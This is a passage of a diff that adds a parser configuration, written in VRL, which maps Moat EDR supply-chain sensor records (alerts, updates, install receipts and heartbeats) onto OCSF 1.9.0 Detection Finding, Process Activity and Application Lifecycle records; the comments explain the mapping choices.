@@ -1,0 +1,1394 @@
+name: moat_edr_ocsf
+display_name: Moat EDR (OCSF)
+version: "1.2.1"
+description: >
+  Preserves unconsumed parsed fields in redacted, dotted snake_case unmapped keys.
+  Parses omarchy-moat supply-chain sensor records (moat-ship NDJSON envelope)
+  into complete OCSF 1.9.0 records, routed by the envelope's class + kind:
+    alerts/alert     -> Detection Finding 2004 (Create)
+    alerts/update    -> Detection Finding 2004 (Update)
+    alerts/receipt   -> Process Activity 1007 (Terminate) - a package-install root exiting
+    moat/heartbeat   -> Application Lifecycle 6002 (Other) - shipper liveness
+    process/exec     -> Process Activity 1007 (Launch)
+    process/exit     -> Process Activity 1007 (Terminate)
+    network/connect  -> Network Activity 4001 (Open)
+    file/file_write  -> File System Activity 1001 (Create | Update, from `verdict`)
+    file/file_chmod  -> File System Activity 1001 (Set Attributes)
+  Only the `alerts` class ships by default; process/network/file are the opt-in
+  telemetry classes of moat's SHIPPING.md §2 and are handled here so enabling one
+  never produces unparsed events.
+  On a finding the acting process is the ACTOR (2004 carries `actor`/`device`
+  through the `host` profile, and `action`/`disposition`/`is_alert`/`risk_*`
+  through `security_control`); the file or destination a finding is ABOUT has no
+  home on 2004, so it is carried in `evidences[]` for OCSF consumers and in
+  promoted `observables[]` so it stays pivotable in the lake.
+  moat's own facet vocabulary - moat_tier, family, tier, surface, context, mode,
+  rarity, suppressed_by, provenance, chain and triage - is carried under
+  `unmapped.*`, which is queryable. The bulky `explain` block is deliberately not
+  copied out of `raw_data`.
+  Emits the whole OCSF object on the root so it lands in ocsf_logs.event and the
+  promoted columns materialize.
+ocsf_version: "1.9.0"
+match_values:
+  - moat_edr
+  - moat
+category: endpoint
+vendor: "Omarchy"
+product: "Moat"
+parser_vrl: |
+  # omarchy-moat -> OCSF 1.9.0. Emits the COMPLETE OCSF record on the root.
+  #
+  # Wire format (moatd/src/ship.rs `envelope`):
+  #   { v, event_id, host, class, kind, moat_tier, severity, "@timestamp",
+  #     moat: <the record itself> }
+  #
+  # `class` is the telemetry stream (alerts | process | network | file), or
+  # "moat" for the shipper's own heartbeat. `kind` discriminates within it.
+  raw_log = string!(.message)
+  __raw_body = raw_log
+  __source_kv = {}
+  parsed, err = parse_json(raw_log)
+  __source_kv = object(parsed) ?? {}
+
+  if err != null || !is_object(parsed) {
+      # 2004 is moat's primary output, so an unparseable line stays in the
+      # findings lane rather than being filed as telemetry it is not.
+      . = {
+          "class_uid": 2004,
+          "class_name": "Detection Finding",
+          "category_uid": 2,
+          "category_name": "Findings",
+          "activity_id": 99,
+          "activity_name": "Other",
+          "type_uid": 200499,
+          "severity_id": 1,
+          "severity": "Informational",
+          "status_id": 1,
+          "status": "New",
+          "time": to_int(to_unix_timestamp(now(), unit: "milliseconds")),
+          "raw_data": raw_log,
+          "finding_info": { "uid": sha2("moat_edr|raw|" + raw_log, variant: "SHA-256"), "title": "Unparseable moat record" },
+          "device": { "hostname": "unknown", "type_id": 0 },
+          "metadata": {
+              "version": "1.9.0",
+              "profiles": ["host"],
+              "uid": sha2("moat_edr|raw|" + raw_log, variant: "SHA-256"),
+              "log_name": "moat_edr",
+              "log_source": "moat_edr",
+              "product": { "name": "Moat", "vendor_name": "Omarchy" }
+          }
+      }
+  } else {
+      p = object!(parsed)
+
+      env_class = to_string(p.class) ?? ""
+      kind = to_string(p.kind) ?? ""
+      host = downcase(to_string(p.host) ?? "")
+      event_id = to_string(p.event_id) ?? ""
+      record_uid_seed = event_id
+      if record_uid_seed == "" { record_uid_seed = sha2("moat_edr|raw|" + raw_log, variant: "SHA-256") }
+      moat_tier = to_string(p.moat_tier) ?? ""
+      env_sev = downcase(to_string(p.severity) ?? "")
+      m = object(p.moat) ?? {}
+
+      # ---- time ---------------------------------------------------------
+      # `@timestamp` is the envelope's copy of the record's own `ts`. Updates
+      # and receipts carry their timestamp one level down instead (moat's
+      # envelope reads `body.ts`, which those two shapes do not have), so they
+      # would otherwise all land on the epoch.
+      ts_str = to_string(p."@timestamp") ?? ""
+      if ts_str == "" { ts_str = to_string(m.ts) ?? "" }
+      if ts_str == "" { ts_str = to_string(m.update.ts) ?? "" }
+      if ts_str == "" { ts_str = to_string(m.receipt.started) ?? "" }
+      # About half of all `update` records carry no timestamp anywhere - moat's
+      # envelope reads `body.ts` and the shipper does not backfill one. Ingest
+      # time is wrong by seconds; the epoch is wrong by 56 years, and would put
+      # every one of them outside any hunt window.
+      time_ms = to_int(to_unix_timestamp(now(), unit: "milliseconds"))
+      if ts_str != "" {
+          parsed_ts, ts_err = parse_timestamp(ts_str, "%+")
+          if ts_err == null {
+              time_ms = to_unix_timestamp(parsed_ts, unit: "milliseconds")
+          }
+      }
+
+      # ---- severity: moat's five names -> OCSF severity_id ---------------
+      sev_name = env_sev
+      if sev_name == "" { sev_name = downcase(to_string(m.severity) ?? "") }
+      severity_id = 1
+      severity = "Informational"
+      if sev_name == "low" { severity_id = 2; severity = "Low" }
+      if sev_name == "medium" { severity_id = 3; severity = "Medium" }
+      if sev_name == "high" { severity_id = 4; severity = "High" }
+      if sev_name == "critical" { severity_id = 5; severity = "Critical" }
+
+      device_hostname = host
+      if device_hostname == "" { device_hostname = "unknown" }
+      device = { "hostname": device_hostname, "type_id": 0 }
+
+      obs = []
+      if host != "" {
+          obs = push(obs, { "name": "device.hostname", "type": "Hostname", "type_id": 1, "value": host })
+      }
+
+      unmapped = {}
+      if moat_tier != "" { unmapped.moat_tier = moat_tier }
+
+      ocsf = {}
+      class_uid = 0
+      class_name = "Base Event"
+      category_uid = 0
+      category_name = "Uncategorized"
+      activity_id = 99
+      activity_name = "Other"
+      event_code = kind
+      correlation_uid = ""
+      profiles = ["host"]
+
+      if env_class == "alerts" && kind == "alert" {
+          # ================= Detection Finding 2004 (Create) =============
+          class_uid = 2004
+          class_name = "Detection Finding"
+          category_uid = 2
+          category_name = "Findings"
+          activity_id = 1
+          activity_name = "Create"
+          profiles = ["host", "security_control"]
+
+          rule = to_string(m.rule) ?? ""
+          family = to_string(m.family) ?? ""
+          event_code = rule
+
+          alert_id = to_string(m.id) ?? ""
+          if alert_id == "" { alert_id = event_id }
+          if alert_id == "" { alert_id = sha2("moat_edr|raw|" + raw_log, variant: "SHA-256") }
+          title = to_string(m.title) ?? ""
+          if title == "" { title = rule }
+          if title == "" { title = "moat alert" }
+
+          finding_info = {
+              "uid": alert_id,
+              "title": title,
+              "data_sources": ["moat_edr", host]
+          }
+          if family != "" { finding_info.types = [family] }
+          if rule != "" {
+              # Every moat rule - kernel policy or userland correlation - is a
+              # named rule, not a model. type_id 1 "Rule" throughout.
+              finding_info.analytic = { "name": rule, "uid": rule, "type_id": 1, "type": "Rule" }
+          }
+          ocsf.finding_info = finding_info
+
+          summary = to_string(m.summary) ?? ""
+          if summary != "" { ocsf.message = summary }
+
+          # `surface: alerts` is moat's own "this is on the badge, a person has
+          # not answered it" - exactly what is_alert means.
+          ocsf.is_alert = (to_string(m.surface) ?? "") == "alerts"
+
+          count = to_int(m.count) ?? 0
+          if count > 0 { ocsf.count = count }
+
+          # risk_level restates the FINAL (context-adjusted) severity. No score
+          # is synthesized - moat does not produce one.
+          risk_level_id = 0
+          risk_level = "Info"
+          if sev_name == "low" { risk_level_id = 1; risk_level = "Low" }
+          if sev_name == "medium" { risk_level_id = 2; risk_level = "Medium" }
+          if sev_name == "high" { risk_level_id = 3; risk_level = "High" }
+          if sev_name == "critical" { risk_level_id = 4; risk_level = "Critical" }
+          ocsf.risk_level_id = risk_level_id
+          ocsf.risk_level = risk_level
+
+          # ---- what moat DID: action_taken -> disposition / action -------
+          acted = to_string(m.action_taken) ?? "none"
+          disposition_id = 15
+          disposition = "Detected"
+          action_id = 3
+          action = "Observed"
+          if acted == "blocked" || acted == "killed" {
+              disposition_id = 2; disposition = "Blocked"; action_id = 2; action = "Denied"
+          }
+          if acted == "quarantined" {
+              disposition_id = 3; disposition = "Quarantined"; action_id = 2; action = "Denied"
+          }
+          if acted == "restored" {
+              disposition_id = 1; disposition = "Allowed"; action_id = 1; action = "Allowed"
+          }
+          ocsf.disposition_id = disposition_id
+          ocsf.disposition = disposition
+          ocsf.action_id = action_id
+          ocsf.action = action
+
+          # ---- the finding's lifecycle ----------------------------------
+          # A suppression is a finding that a rule already answered; an ack is
+          # one a person answered. Neither is "New".
+          suppressed_by = to_string(m.suppressed_by) ?? ""
+          status_id = 1
+          status = "New"
+          if suppressed_by != "" {
+              status_id = 3; status = "Suppressed"
+              ocsf.status_detail = suppressed_by
+          }
+          if (bool(m.acked) ?? false) { status_id = 4; status = "Resolved" }
+          ocsf.status_id = status_id
+          ocsf.status = status
+
+          # ---- the acting process is the ACTOR on a finding --------------
+          proc = object(m.process) ?? {}
+          exe = to_string(proc.exe) ?? ""
+          exe_name = ""
+          if exe != "" {
+              nm, nm_err = parse_regex(exe, r'(?P<b>[^/]+)$')
+              if nm_err == null { exe_name = to_string(nm.b) }
+          }
+          actor_process = {}
+          if exe_name != "" { actor_process.name = exe_name }
+          if exe != "" { actor_process.file = { "name": exe_name, "path": exe, "type_id": 1 } }
+          args = to_string(proc.args) ?? ""
+          if args != "" { actor_process.cmd_line = args }
+          proc_pid = to_int(proc.pid) ?? -1
+          if proc_pid >= 0 { actor_process.pid = proc_pid }
+
+          actor = {}
+          if proc_pid >= 0 { actor.process = actor_process }
+          proc_uid = to_int(proc.uid) ?? -1
+          if proc_uid >= 0 { actor.user = { "uid": to_string(proc_uid) } }
+          if length(actor) > 0 { ocsf.actor = actor }
+          ocsf.device = device
+
+          # ---- what the finding is ABOUT --------------------------------
+          # 2004 defines no `file` / `dst_endpoint`, so the target artifacts go
+          # into evidences[] (OCSF) and observables[] (promoted, pivotable).
+          # Only artifacts with no other home go in here: the acting process is
+          # already in actor.process and the host in device, and repeating them
+          # would pay for the same value twice in a columnar store.
+          evidence = {}
+
+          fpath = to_string(m.file.path) ?? ""
+          fsha = downcase(to_string(m.file.sha256) ?? "")
+          if fpath != "" {
+              fname = ""
+              fn, fn_err = parse_regex(fpath, r'(?P<b>[^/]+)$')
+              if fn_err == null { fname = to_string(fn.b) }
+              file_obj = { "name": fname, "path": fpath, "type_id": 1 }
+              if fsha != "" { file_obj.hashes = [{ "algorithm_id": 3, "value": fsha }] }
+              evidence.file = file_obj
+              obs = push(obs, { "name": "evidences.file.path", "type": "File Name", "type_id": 7, "value": fpath })
+              if fsha != "" {
+                  obs = push(obs, { "name": "evidences.file.hashes.value", "type": "Hash", "type_id": 8, "value": fsha })
+              }
+          }
+
+          dst_ip = to_string(m.net.dst_ip) ?? ""
+          dst_domain = to_string(m.net.domain) ?? ""
+          if dst_ip != "" || dst_domain != "" {
+              dst = {}
+              if dst_ip != "" { dst.ip = downcase(dst_ip) }
+              if dst_domain != "" { dst.hostname = downcase(dst_domain) }
+              dst_port = to_int(m.net.dst_port) ?? 0
+              if dst_port > 0 { dst.port = dst_port }
+              evidence.dst_endpoint = dst
+              if dst_ip != "" {
+                  obs = push(obs, { "name": "evidences.dst_endpoint.ip", "type": "IP Address", "type_id": 2, "value": downcase(dst_ip) })
+              }
+              if dst_domain != "" {
+                  obs = push(obs, { "name": "evidences.dst_endpoint.hostname", "type": "Hostname", "type_id": 1, "value": downcase(dst_domain) })
+              }
+          }
+
+          # ---- name resolution (moat docs/DNS.md) -----------------------
+          #
+          # OCSF has real homes for this and they are not `unmapped`:
+          #
+          #   evidences[].query    a dns_query. `query.hostname` is a PROMOTED
+          #                        field, so the resolved name is a column.
+          #   evidences[].actor    an actor, distinct from the top-level one.
+          #                        The top-level actor is the process that
+          #                        ACTED; this is the process that ASKED, and
+          #                        the whole point of moat's varlink probe is
+          #                        that those two can differ.
+          #
+          # `query` is not an attribute of Detection Finding 2004 itself -- it
+          # belongs to DNS Activity 4003 -- but `evidences` (evidence_artifacts)
+          # carries one, which is the correct way to attach a lookup to a
+          # finding that is not itself a DNS event.
+          #
+          # What stays under `unmapped` stays there because OCSF 1.9 has no
+          # field for it, not because it was easier: the age of a cached
+          # resolution, whether the asker and the actor are the same process,
+          # and a CNAME owner outside a dns_answer array.
+          if dst_domain != "" {
+              evidence.query = { "hostname": downcase(dst_domain) }
+          }
+
+          dns = {}
+          queried_by = to_string(m.net.domain_queried_by) ?? ""
+          if queried_by != "" {
+              # moat ships "<exe> (pid N)". Split it so the asker lands in a
+              # real actor.process rather than as a string nobody can join on.
+              qm = parse_regex(queried_by, r'^(?P<exe>.+?)\s+\(pid\s+(?P<pid>\d+)\)$') ?? {}
+              q_exe = to_string(qm.exe)
+              q_pid = to_int(qm.pid) ?? 0
+              q_proc = {}
+              if q_exe != "" {
+                  q_parts = split(q_exe, "/")
+                  q_name = to_string(q_parts[-1])
+                  if q_name != "" { q_proc.name = q_name }
+                  q_proc.file = { "name": q_name, "path": q_exe, "type_id": 1 }
+              }
+              if q_pid > 0 { q_proc.pid = q_pid }
+              if length(q_proc) > 0 {
+                  evidence.actor = { "process": q_proc }
+                  q_obs_name = to_string(q_proc.name)
+                  if q_obs_name != "" {
+                      obs = push(obs, { "name": "evidences.actor.process.name", "type": "Process Name", "type_id": 9, "value": q_obs_name })
+                  }
+              }
+              # Did the process that asked also connect? OCSF has no field for
+              # it and it is the single most useful thing on the record: one
+              # program resolving a name and a different one using the address
+              # is the shape worth looking at.
+              if q_pid > 0 && proc_pid >= 0 {
+                  dns.queried_by_self = q_pid == proc_pid
+              }
+          }
+          d_age = to_int(m.net.domain_age_secs) ?? -1
+          if d_age >= 0 {
+              # The name is cached by address, so a large age is the cue that a
+              # CDN address may since have been handed to somebody else.
+              dns.resolution_age_secs = d_age
+          }
+          d_cname = to_string(m.net.domain_cname) ?? ""
+          if d_cname != "" {
+              dns.cname = downcase(d_cname)
+              obs = push(obs, { "name": "unmapped.dns.cname", "type": "Hostname", "type_id": 1, "value": downcase(d_cname) })
+          }
+          if length(dns) > 0 { unmapped.dns = dns }
+
+          # ---- the indicator that fired -> osint[] ----------------------
+          #
+          # `osint` is a REQUIRED attribute of Detection Finding 2004 and this
+          # parser emitted none, so every moat finding was short a required
+          # field. Nothing caught it: the local gate reports schema=SKIPPED
+          # unless OCSF_VALIDATOR is set, and the promoted-path check
+          # deliberately skips everything under `unmapped.`, which is where the
+          # indicator would otherwise have gone.
+          #
+          # moat's `ioc.matched` is prefixed by kind ("domain:evil.example",
+          # "sha256:..."), which maps straight onto osint.type_id: 2 Domain,
+          # 4 Hash, 99 Other. `vendor_name` carries which feed said so --
+          # "domain-feed" is the published ThreatFox list, "hash-feed" the
+          # operator's own -- because "who claims this" is the first question
+          # asked of any indicator.
+          osint = []
+          ioc = object(m.ioc) ?? {}
+          if length(ioc) > 0 {
+              ioc_source = to_string(ioc.source) ?? ""
+              ioc_matched = to_string(ioc.matched) ?? ""
+              if ioc_matched != "" {
+                  iparts = split(ioc_matched, ":", limit: 2)
+                  ikind = to_string(iparts[0])
+                  ivalue = to_string(iparts[1])
+                  if ivalue == "" {
+                      # No prefix: the whole string is the value and the kind
+                      # is not something to guess at.
+                      ivalue = ioc_matched
+                      ikind = ""
+                  }
+                  ind = { "value": ivalue, "type_id": 99, "type": "Other" }
+                  if ikind == "domain" {
+                      ind.type_id = 2
+                      ind.type = "Domain"
+                      ind.value = downcase(ivalue)
+                      obs = push(obs, { "name": "osint.value", "type": "Hostname", "type_id": 1, "value": downcase(ivalue) })
+                  } else if ikind == "sha256" || ikind == "hash" {
+                      ind.type_id = 4
+                      ind.type = "Hash"
+                      ind.value = downcase(ivalue)
+                      obs = push(obs, { "name": "osint.value", "type": "Hash", "type_id": 8, "value": downcase(ivalue) })
+                  } else {
+                      obs = push(obs, { "name": "osint.value", "type": "Other", "type_id": 0, "value": ivalue })
+                  }
+                  if ioc_source != "" { ind.vendor_name = ioc_source }
+                  osint = push(osint, ind)
+              }
+          }
+          # `osint` lives behind the OSINT PROFILE, and that is the whole of
+          # the rule: the profile ADDS the attribute, and `requirement:
+          # required` inside it means "if you apply this profile you must
+          # supply one" -- not "every Detection Finding needs one". So the
+          # attribute is legal only when "osint" is in metadata.profiles, and
+          # the profile is only worth applying when there is an indicator.
+          #
+          # An earlier version got both halves wrong: it emitted `osint: []`
+          # unconditionally and never declared the profile, which a real OCSF
+          # validator rejects outright -- `attribute "osint" is not defined for
+          # this OCSF class/profile`. Nothing local caught it, because the gate
+          # reports schema=SKIPPED unless OCSF_VALIDATOR is set.
+          if length(osint) > 0 {
+              ocsf.osint = osint
+              profiles = push(profiles, "osint")
+          }
+
+          # ...and the same indicator as an ENRICHMENT, because the two answer
+          # different questions.
+          #
+          # `osint` is what OCSF 1.9 says an indicator is, and it is a required
+          # attribute of this class. `enrichments` is what this platform
+          # PROMOTES: `enrichments.value`, `enrichments.provider`,
+          # `enrichments.data.is_ioc`, `.ioc_type`, `.matched_field` and
+          # `.threat_type` are all columns, while nothing under `osint.` or
+          # `evidences.` is. A record carrying only `osint` is correct and
+          # effectively unqueryable here; one carrying only `enrichments` is
+          # queryable and not conformant. The promoted list even names the
+          # convention -- `enrichments[name=ioc_domain_threat_type].value` --
+          # so this follows it rather than inventing a shape.
+          if length(osint) > 0 {
+              ind0 = object(osint[0]) ?? {}
+              i_type = downcase(to_string(ind0.type))
+              if i_type == "" { i_type = "other" }
+              # WHICH field of the record the feed matched. Without it a
+              # reader cannot tell an indicator that matched the connection's
+              # name from one that matched a file hash.
+              matched_field = "net.domain"
+              if i_type == "hash" { matched_field = "file.sha256" }
+              enrich = {
+                  "name": "ioc_" + i_type + "_threat_type",
+                  "type": "ioc",
+                  "value": to_string(ind0.value),
+                  "data": {
+                      "is_ioc": true,
+                      "ioc_type": i_type,
+                      "matched_field": matched_field
+                  }
+              }
+              v_name = to_string(ind0.vendor_name)
+              if v_name != "" { enrich.provider = v_name }
+              ocsf.enrichments = [enrich]
+          }
+
+          if length(evidence) > 0 { ocsf.evidences = [evidence] }
+          if exe_name != "" {
+              obs = push(obs, { "name": "actor.process.name", "type": "Process Name", "type_id": 9, "value": exe_name })
+          }
+
+          # ---- moat's facet vocabulary ----------------------------------
+          # SHIPPING.md §5 "the one field to facet on" plus the four fields it
+          # is derived from, the scoring trail, and provenance. The `explain`
+          # block is intentionally NOT copied - it is several KB already sitting
+          # in raw_data.
+          if family != "" { unmapped.family = family }
+          if rule != "" { unmapped.rule = rule }
+          tier = to_string(m.tier) ?? ""
+          if tier != "" { unmapped.tier = tier }
+          surface = to_string(m.surface) ?? ""
+          if surface != "" { unmapped.surface = surface }
+          context = to_string(m.context) ?? ""
+          if context != "" { unmapped.context = context }
+          mode = to_string(m.mode) ?? ""
+          if mode != "" { unmapped.mode = mode }
+          if acted != "" { unmapped.action_taken = acted }
+          sev_base = to_string(m.severity_base) ?? ""
+          if sev_base != "" { unmapped.severity_base = sev_base }
+          sev_reason = to_string(m.severity_reason) ?? ""
+          if sev_reason != "" { unmapped.severity_reason = sev_reason }
+          rarity = to_string(m.rarity) ?? ""
+          if rarity != "" { unmapped.rarity = rarity }
+          rarity_text = to_string(m.rarity_text) ?? ""
+          if rarity_text != "" { unmapped.rarity_text = rarity_text }
+          if suppressed_by != "" { unmapped.suppressed_by = suppressed_by }
+          unmapped.pkg_install_escalation = bool(m.pkg_install_escalation) ?? false
+          unmapped.acked = bool(m.acked) ?? false
+          acked_by = to_string(m.acked_by) ?? ""
+          if acked_by != "" { unmapped.acked_by = acked_by }
+          provenance = to_string(m.actor.provenance) ?? ""
+          if provenance != "" { unmapped.provenance = provenance }
+          actor_package = to_string(m.actor.package) ?? ""
+          if actor_package != "" { unmapped.actor_package = actor_package }
+          actor_script = to_string(m.actor.script) ?? ""
+          if actor_script != "" { unmapped.actor_script = actor_script }
+          cwd = to_string(proc.cwd) ?? ""
+          if cwd != "" { unmapped.cwd = cwd }
+
+          # Ancestry, root-first, as one greppable string. moat ships it
+          # leaf-first; its own summaries read root -> leaf.
+          # moat ships ancestry leaf-first (parent, grandparent, ... init) and
+          # renders it root-first. Prepending each entry rebuilds that order;
+          # VRL has no reverse().
+          anc = array(m.process.ancestry) ?? []
+          if length(anc) > 0 {
+              acc = ""
+              for_each(anc) -> |_i, a| {
+                  ae = to_string(a.exe) ?? ""
+                  if ae != "" {
+                      if acc == "" { acc = ae } else { acc = ae + " -> " + acc }
+                  }
+              }
+              if acc != "" {
+                  if exe != "" { acc = acc + " -> " + exe }
+                  unmapped.ancestry = acc
+                  unmapped.ancestry_depth = length(anc)
+              }
+          }
+
+          # ---- correlation chain (design 2b/3a) -------------------------
+          chain = object(m.chain) ?? {}
+          if length(chain) > 0 {
+              correlation_uid = to_string(chain.id) ?? ""
+              unmapped.chain_id = correlation_uid
+              unmapped.chain_severity = to_string(chain.severity) ?? ""
+              unmapped.chain_severity_base = to_string(chain.severity_base) ?? ""
+              unmapped.chain_severity_reason = to_string(chain.severity_reason) ?? ""
+              unmapped.chain_summary = to_string(chain.summary) ?? ""
+              unmapped.chain_steps_total = to_int(chain.steps_total) ?? 0
+              unmapped.chain_triggers_total = to_int(chain.triggers_total) ?? 0
+              unmapped.chain_span_secs = to_int(chain.span_secs) ?? 0
+              unmapped.chain_ancestor_exe = to_string(chain.ancestor.exe) ?? ""
+              fams = array(chain.families) ?? []
+              if length(fams) > 0 { unmapped.chain_families = join!(fams, ",") }
+              mems = array(chain.members) ?? []
+              if length(mems) > 0 { unmapped.chain_members = join!(mems, ",") }
+              rules_seen = []
+              steps = array(chain.steps) ?? []
+              for_each(steps) -> |_i, s| {
+                  sr = to_string(s.rule) ?? ""
+                  if sr != "" { rules_seen = push(rules_seen, sr) }
+              }
+              if length(rules_seen) > 0 { unmapped.chain_rules = join!(rules_seen, ",") }
+          }
+
+          # ---- AI triage verdict (LEARNING-AND-ANALYSIS) -----------------
+          triage = object(m.triage) ?? {}
+          if length(triage) > 0 {
+              unmapped.triage_verdict = to_string(triage.verdict) ?? ""
+              unmapped.triage_confidence = to_string(triage.confidence) ?? ""
+              unmapped.triage_outcome = to_string(triage.outcome) ?? ""
+              unmapped.triage_agent = to_string(triage.agent) ?? ""
+              unmapped.triage_summary = to_string(triage.summary) ?? ""
+              unmapped.triage_at = to_string(triage.at) ?? ""
+              tpa = to_string(triage.proposed_allowlist) ?? ""
+              if tpa != "" { unmapped.triage_proposed_allowlist = tpa }
+          }
+
+          # ---- staged evidence: the snapshot exists, its bytes never ship -
+          inc_dir = to_string(m.incident.dir) ?? ""
+          if inc_dir != "" {
+              unmapped.incident_dir = inc_dir
+              unmapped.incident_file_count = length(array(m.incident.files) ?? [])
+          }
+
+          # ---- content capture: shape, never the body --------------------
+          content = array(m.content) ?? []
+          if length(content) > 0 {
+              ckinds = []
+              for_each(content) -> |_i, c| {
+                  ck = to_string(c.kind) ?? ""
+                  if ck != "" { ckinds = push(ckinds, ck) }
+              }
+              if length(ckinds) > 0 { unmapped.content_kinds = join!(ckinds, ",") }
+              unmapped.content_count = length(content)
+          }
+
+          acts = array(m.actions) ?? []
+          if length(acts) > 0 { unmapped.actions_available = join!(acts, ",") }
+          carried_gen = to_int(m.carried.generation) ?? 0
+          if carried_gen > 0 { unmapped.carried_generation = carried_gen }
+
+      } else if env_class == "alerts" && kind == "update" {
+          # ================= Detection Finding 2004 (Update) =============
+          # A state change on an alert already shipped: an ack, a re-count, a
+          # chain that grew, a triage verdict that landed. Same finding_info.uid
+          # so it joins to the Create.
+          class_uid = 2004
+          class_name = "Detection Finding"
+          category_uid = 2
+          category_name = "Findings"
+          activity_id = 2
+          activity_name = "Update"
+          profiles = ["host", "security_control"]
+
+          u = object(m.update) ?? {}
+          alert_id = to_string(m.id) ?? ""
+          if alert_id == "" { alert_id = event_id }
+          if alert_id == "" { alert_id = sha2("moat_edr|raw|" + raw_log, variant: "SHA-256") }
+          ocsf.finding_info = {
+              "uid": alert_id,
+              "title": "moat alert state change",
+              "data_sources": ["moat_edr", host]
+          }
+          ocsf.device = device
+
+          status_id = 2
+          status = "In Progress"
+          if (bool(u.acked) ?? false) { status_id = 4; status = "Resolved" }
+          ocsf.status_id = status_id
+          ocsf.status = status
+
+          count = to_int(u.count) ?? 0
+          if count > 0 { ocsf.count = count }
+
+          unmapped.acked = bool(u.acked) ?? false
+          acked_by = to_string(u.acked_by) ?? ""
+          if acked_by != "" { unmapped.acked_by = acked_by }
+          surface = to_string(u.surface) ?? ""
+          if surface != "" { unmapped.surface = surface }
+          upd_ts = to_string(u.ts) ?? ""
+          if upd_ts != "" { unmapped.update_ts = upd_ts }
+
+          chain = object(u.chain) ?? {}
+          if length(chain) > 0 {
+              correlation_uid = to_string(chain.id) ?? ""
+              unmapped.chain_id = correlation_uid
+              unmapped.chain_severity = to_string(chain.severity) ?? ""
+              unmapped.chain_summary = to_string(chain.summary) ?? ""
+              unmapped.chain_steps_total = to_int(chain.steps_total) ?? 0
+              unmapped.chain_span_secs = to_int(chain.span_secs) ?? 0
+              fams = array(chain.families) ?? []
+              if length(fams) > 0 { unmapped.chain_families = join!(fams, ",") }
+          }
+          triage = object(u.triage) ?? {}
+          if length(triage) > 0 {
+              unmapped.triage_verdict = to_string(triage.verdict) ?? ""
+              unmapped.triage_confidence = to_string(triage.confidence) ?? ""
+              unmapped.triage_outcome = to_string(triage.outcome) ?? ""
+              unmapped.triage_agent = to_string(triage.agent) ?? ""
+              unmapped.triage_summary = to_string(triage.summary) ?? ""
+          }
+          inc_dir = to_string(u.incident.dir) ?? ""
+          if inc_dir != "" {
+              unmapped.incident_dir = inc_dir
+              unmapped.incident_file_count = length(array(u.incident.files) ?? [])
+          }
+
+      } else if env_class == "alerts" && kind == "receipt" {
+          # ================= Process Activity 1007 (Terminate) ===========
+          # An install receipt is written when the package-install ROOT process
+          # exits, and carries that process, its exit code, how long it ran and
+          # what its subtree did. 1007/Terminate is the shape that already has
+          # all four; the behavioural counters ride in unmapped.
+          class_uid = 1007
+          class_name = "Process Activity"
+          category_uid = 1
+          category_name = "System Activity"
+          activity_id = 2
+          activity_name = "Terminate"
+
+          r = object(m.receipt) ?? {}
+          receipt_id = to_string(r.id) ?? ""
+          if receipt_id == "" { receipt_id = record_uid_seed }
+          root_exe = to_string(r.root_exe) ?? ""
+          root_name = ""
+          if root_exe != "" {
+              rn, rn_err = parse_regex(root_exe, r'(?P<b>[^/]+)$')
+              if rn_err == null { root_name = to_string(rn.b) }
+          }
+          rp = { "uid": receipt_id }
+          if root_name != "" { rp.name = root_name }
+          if root_exe != "" { rp.file = { "name": root_name, "path": root_exe, "type_id": 1 } }
+          root_args = to_string(r.root_args) ?? ""
+          if root_args != "" { rp.cmd_line = root_args }
+          ocsf.process = rp
+          # There is no recorded launcher for an install root - the receipt is
+          # about the root itself, so it is its own actor rather than a fake pid.
+          ocsf.actor = { "process": rp }
+          ocsf.device = device
+
+          exit_code = to_int(r.exit) ?? 0
+          ocsf.status_code = to_string(exit_code)
+          if exit_code == 0 { ocsf.status_id = 1; ocsf.status = "Success" }
+          if exit_code != 0 { ocsf.status_id = 2; ocsf.status = "Failure" }
+          dur_s = to_int(r.duration_s) ?? 0
+          if dur_s > 0 { ocsf.duration = dur_s * 1000 }
+
+          if root_name != "" {
+              obs = push(obs, { "name": "process.name", "type": "Process Name", "type_id": 9, "value": root_name })
+          }
+
+          unmapped.receipt_id = receipt_id
+          event_code = "receipt"
+          rcwd = to_string(r.cwd) ?? ""
+          if rcwd != "" { unmapped.cwd = rcwd }
+          started = to_string(r.started) ?? ""
+          if started != "" { unmapped.started = started }
+          unmapped.execs_from_tree = to_int(r.execs_from_tree) ?? 0
+          unmapped.execs_from_tmp = to_int(r.execs_from_tmp) ?? 0
+          # The five lists are the whole point of a receipt: what an install
+          # touched outside its own tree. Counts facet, the joined paths pivot.
+          pis = array(r.postinstall_scripts) ?? []
+          unmapped.postinstall_script_count = length(pis)
+          if length(pis) > 0 { unmapped.postinstall_scripts = join!(pis, ",") }
+          wop = array(r.writes_outside_project) ?? []
+          unmapped.writes_outside_project_count = length(wop)
+          if length(wop) > 0 { unmapped.writes_outside_project = join!(wop, ",") }
+          creads = array(r.credential_reads) ?? []
+          unmapped.credential_read_count = length(creads)
+          if length(creads) > 0 { unmapped.credential_reads = join!(creads, ",") }
+          pwrites = array(r.persistence_writes) ?? []
+          unmapped.persistence_write_count = length(pwrites)
+          if length(pwrites) > 0 { unmapped.persistence_writes = join!(pwrites, ",") }
+          rnet = array(r.network) ?? []
+          unmapped.network_count = length(rnet)
+          if length(rnet) > 0 { unmapped.network = join!(rnet, ",") }
+
+      } else if kind == "heartbeat" {
+          # ================= Application Lifecycle 6002 (Other) ==========
+          # SHIPPING.md §5: "alert on its absence". A shipper that has died is
+          # indistinguishable from a quiet machine, so this has to be a fact the
+          # lake can be queried for. 6002's activities are install/start/stop/
+          # update - a periodic liveness beat is none of them, hence Other.
+          class_uid = 6002
+          class_name = "Application Lifecycle"
+          category_uid = 6
+          category_name = "Application Activity"
+          activity_id = 99
+          activity_name = "Other"
+
+          ocsf.app = { "name": "moat-ship" }
+          hb_version = to_string(m.version) ?? ""
+          if hb_version != "" { ocsf.app.version = hb_version }
+          ocsf.device = device
+
+          last_error = to_string(m.last_error) ?? ""
+          if last_error == "" { ocsf.status_id = 1; ocsf.status = "Success" }
+          if last_error != "" {
+              ocsf.status_id = 2
+              ocsf.status = "Failure"
+              ocsf.status_detail = last_error
+          }
+
+          event_code = "heartbeat"
+          unmapped.app = "moat-ship"
+          unmapped.shipped = to_int(m.shipped) ?? 0
+          unmapped.dropped = to_int(m.dropped) ?? 0
+          unmapped.withheld = to_int(m.withheld) ?? 0
+          unmapped.backlog = to_int(m.backlog) ?? 0
+          unmapped.backlog_bytes = to_int(m.backlog_bytes) ?? 0
+          unmapped.transport = to_string(m.transport) ?? ""
